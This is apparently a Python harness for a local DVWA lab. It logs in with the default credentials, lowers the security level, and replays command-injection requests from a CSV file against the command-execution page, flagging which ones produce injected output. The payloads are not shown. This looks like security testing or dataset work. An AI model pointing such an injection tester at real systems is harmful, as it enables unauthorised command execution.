import csv
import requests
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
import re

DVWA_BASE = 'http://localhost:8080'
LOGIN_URL = f'{DVWA_BASE}/login.php'
ATTACK_URL = f'{DVWA_BASE}/vulnerabilities/exec/'
DATASET = 'command.csv'

def get_csrf_token(session):
    resp = session.get(LOGIN_URL)
    soup = BeautifulSoup(resp.text, 'html.parser')
    token = soup.find('input', {'name': 'user_token'})
    return token['value'] if token else None

def login(session):
    token = get_csrf_token(session)
    payload = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
    }
    if token:
        payload['user_token'] = token
    resp = session.post(LOGIN_URL, data=payload)
    if 'DVWA Security' in resp.text:
        print("✅ 登入成功")
        security_url = f"{DVWA_BASE}/security.php"
        token = get_csrf_token(session)
        security_data = {'security': 'low', 'seclev_submit': 'Submit'}
        if token:
            security_data['user_token'] = token
        session.post(security_url, data=security_data)
    else:
        print("❌ 登入失敗")
        exit(1)

def test_cmdi(session, row):
    method = row['method'].upper()
    if not re.match(r'^[A-Z]+$', method):
        # print(f"[{row['id']}] ⚠️ 無效的 HTTP 方法: {method}，已跳過")
        return

    url = ATTACK_URL
    headers = {
        'User-Agent': row['user_agent'],
        'Referer': row['refer']
    }

    data = row['body']
    params = {}

    if(method == "POST"):
        print("=== 📨 即將發送的 Request ===")
        print("POST")
        print(f"URL: {url}")
        print(f"Headers: {headers}")
        print(f"Body: {data}")
        print("=" * 50)

    try:
        response = session.request(
            method=method,
            url=url,
            headers=headers,
            params=params,
            data=data
        )
    except requests.exceptions.RequestException as e:
        print(f"[{row['id']}] ❌ 發送失敗：{e}")
        return

    soup = BeautifulSoup(response.text, 'html.parser')
    pre_block = soup.find('pre')
    success = False
    extra_lines = []

    if pre_block:
        print("pre")
        lines = pre_block.get_text().strip().split('\n')
        for line in lines:
            if re.match(r'^(PING|---|\d+ bytes from|packet loss|round-trip)', line):
                continue  # 忽略 ping 相關輸出
            if line.strip():
                extra_lines.append(line.strip())

        if extra_lines:
            print(f"[{row['id']}] ✅ 成功注入（<pre> 中包含額外輸出）")
            success = True
        else:
            print(f"[{row['id']}] 🔍 僅有 ping 結果（未檢出注入效果）")
    elif "You must be logged in" in response.text:
        print(f"[{row['id']}] 🚫 未登入")
    elif response.status_code == 405:
        print(f"[{row['id']}] 🚫 方法不允許（Method Not Allowed）")
    else:
        # print(f"[{row['id']}] ❓ 未知回應")
        return

    if success:
        print("=== 🔼 發送的 Request ===")
        print(f"Method: {method}")
        print(f"URL: {response.url}")
        print(f"Headers: {headers}")
        if method != 'GET':
            print(f"Body: {data}")
        print("=== 🔽 <pre> 中額外輸出 ===")
        for line in extra_lines:
            print(line)
        print("=" * 50)


def load_csv(filename):
    with open(filename, newline='', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        return list(reader)

def main():
    session = requests.Session()
    login(session)
    rows = load_csv(DATASET)
    for row in rows:
        test_cmdi(session, row)

if __name__ == "__main__":
    main()
